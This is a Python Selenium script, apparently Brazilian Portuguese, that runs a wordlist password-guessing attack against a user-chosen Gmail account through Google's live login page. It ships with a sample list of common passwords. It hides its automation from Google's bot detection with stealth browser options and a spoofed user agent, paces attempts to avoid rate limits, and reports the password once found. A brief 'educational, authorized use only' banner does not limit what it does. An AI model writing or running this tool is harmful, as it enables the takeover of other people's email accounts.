import time
import os
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service

class GmailTester:
    def __init__(self, headless=False):
        """Inicializa o testador com configurações do Chrome"""
        self.options = webdriver.ChromeOptions()
        
        # Configurações para evitar detecção
        self.options.add_argument('--disable-blink-features=AutomationControlled')
        self.options.add_experimental_option("excludeSwitches", ["enable-automation"])
        self.options.add_experimental_option('useAutomationExtension', False)
        
        # Desabilita notificações e popups
        self.options.add_argument('--disable-notifications')
        self.options.add_argument('--disable-popup-blocking')
        
        # Mantém o navegador visível por padrão para debugging
        if headless:
            self.options.add_argument('--headless')
        
        # User agent realista
        self.options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        try:
            # Usa webdriver_manager para instalar automaticamente o ChromeDriver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=self.options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.wait = WebDriverWait(self.driver, 15)
            print("✅ ChromeDriver configurado com sucesso!")
        except Exception as e:
            print(f"❌ Erro ao configurar ChromeDriver: {e}")
            print("Tentando com driver padrão...")
            try:
                self.driver = webdriver.Chrome(options=self.options)
                self.wait = WebDriverWait(self.driver, 15)
            except:
                print("❌ Instale o ChromeDriver manualmente ou execute: pip install webdriver-manager")
                sys.exit(1)

    def test_password(self, email, password, verbose=True):
        """Testa uma senha no Gmail"""
        try:
            # Reinicia a página para cada tentativa
            self.driver.get("https://accounts.google.com/")
            time.sleep(2)
            
            if verbose:
                print(f"🔑 Testando: {password}")
            
            # PASSO 1: Inserir email
            try:
                email_input = self.wait.until(EC.presence_of_element_located((By.ID, "identifierId")))
                email_input.clear()
                email_input.send_keys(email)
                
                # Clica em "Próximo"
                next_btn = self.driver.find_element(By.ID, "identifierNext")
                next_btn.click()
                time.sleep(2)
            except Exception as e:
                if verbose:
                    print(f"❌ Erro no campo email: {e}")
                return False
            
            # PASSO 2: Inserir senha
            try:
                password_input = self.wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))
                password_input.clear()
                password_input.send_keys(password)
                
                # Clica em "Próximo"
                password_next = self.driver.find_element(By.ID, "passwordNext")
                password_next.click()
                time.sleep(3)
                
            except TimeoutException:
                # Pode ser que já tenha erro no email
                try:
                    error_msg = self.driver.find_element(By.XPATH, "//div[contains(@class, 'o6cuMc')]")
                    if "não foi encontrada" in error_msg.text or "Couldn't find" in error_msg.text:
                        if verbose:
                            print("❌ Email não existe")
                        return False
                except:
                    pass
                return False
            
            # PASSO 3: Verificar resultado
            time.sleep(2)
            
            # Verifica se está na página do Gmail (login bem sucedido)
            current_url = self.driver.current_url
            if "mail.google.com" in current_url or "inbox" in current_url.lower():
                print(f"\n🎉 SENHA CORRETA: {password}")
                return True
            
            # Verifica mensagens de erro
            try:
                error_elements = self.driver.find_elements(By.XPATH, "//*[contains(text(), 'Senha incorreta') or contains(text(), 'Wrong password') or contains(text(), 'incorrect')]")
                for elem in error_elements:
                    if "incorrect" in elem.text.lower() or "senha" in elem.text.lower():
                        if verbose:
                            print(f"❌ Senha incorreta")
                        return False
            except:
                pass
            
            # Verifica se pede confirmação 2FA
            try:
                two_fa = self.driver.find_elements(By.XPATH, "//*[contains(text(), '2-Step Verification') or contains(text(), 'verificação em duas etapas')]")
                if two_fa:
                    print(f"⚠️ A conta tem 2FA ativado! Senha: {password}")
                    print("A senha está correta, mas requer verificação em duas etapas.")
                    return True
            except:
                pass
            
            # Se chegou aqui, pode ser captcha ou outro bloqueio
            if "sorry" in self.driver.current_url or "captcha" in self.driver.current_url:
                print("⚠️ Captcha detectado! Pausando...")
                time.sleep(5)
                return False
            
            return False
            
        except Exception as e:
            if verbose:
                print(f"❌ Erro: {str(e)[:100]}")
            return False

    def close(self):
        """Fecha o navegador"""
        if self.driver:
            self.driver.quit()

def main():
    print("=" * 60)
    print("🔐 GMAIL PASSWORD TESTER - AMBIENTE EDUCACIONAL")
    print("=" * 60)
    print("\n⚠️ ATENÇÃO: Use apenas em ambiente controlado e com autorização!")
    print("=" * 60)
    
    # Solicita o email
    email = input("\n📧 Digite o email Gmail: ").strip()
    if not email or "@gmail.com" not in email:
        print("❌ Email inválido! Deve conter @gmail.com")
        return
    
    # Verifica wordlist
    wordlist_file = "wordlist.txt"
    if not os.path.exists(wordlist_file):
        print(f"\n❌ Arquivo '{wordlist_file}' não encontrado!")
        
        # Cria uma wordlist de exemplo
        print("\nCriando wordlist de exemplo...")
        example_passwords = [
            "123456",
            "password", 
            "123456789",
            "senha123",
            "admin123",
            "qwerty",
            "teste123",
            "abc123",
            "password123",
            "12345678"
        ]
        with open(wordlist_file, 'w') as f:
            for pwd in example_passwords:
                f.write(pwd + '\n')
        print(f"✅ Wordlist de exemplo criada com {len(example_passwords)} senhas!")
    
    # Lê as senhas
    with open(wordlist_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    if not passwords:
        print("❌ Wordlist vazia!")
        return
    
    print(f"\n📊 Email alvo: {email}")
    print(f"📝 Total de senhas: {len(passwords)}")
    print(f"📂 Arquivo: {wordlist_file}")
    print("\n" + "=" * 60)
    
    # Escolha do modo
    print("\n1 - Modo Normal (mostra navegador)")
    print("2 - Modo Oculto (headless)")
    modo = input("\nEscolha o modo (1/2): ").strip()
    
    # Inicializa o testador
    headless = (modo == "2")
    tester = GmailTester(headless=headless)
    
    try:
        print("\n🚀 Iniciando testes...\n")
        found = False
        
        for i, password in enumerate(passwords, 1):
            print(f"\n[{i}/{len(passwords)}] ", end="")
            
            # Testa a senha
            if tester.test_password(email, password, verbose=True):
                found = True
                print("\n" + "=" * 60)
                print(f"🎉 SENHA ENCONTRADA: {password}")
                print("=" * 60)
                break
            
            # Pausa entre tentativas
            time.sleep(2)
            
            # A cada 5 tentativas, pausa mais longa
            if i % 5 == 0:
                print("⏳ Pausa de 5 segundos...")
                time.sleep(5)
        
        if not found:
            print("\n❌ Nenhuma senha correta encontrada!")
            print("Possíveis motivos:")
            print("- A senha não está na wordlist")
            print("- A conta tem 2FA ativado")
            print("- Bloqueio de segurança do Google")
            print("- Captcha ou verificação adicional necessária")
    
    except KeyboardInterrupt:
        print("\n\n⏹️ Teste interrompido pelo usuário!")
    
    finally:
        tester.close()
        print("\n👋 Programa finalizado!")

if __name__ == "__main__":
    main()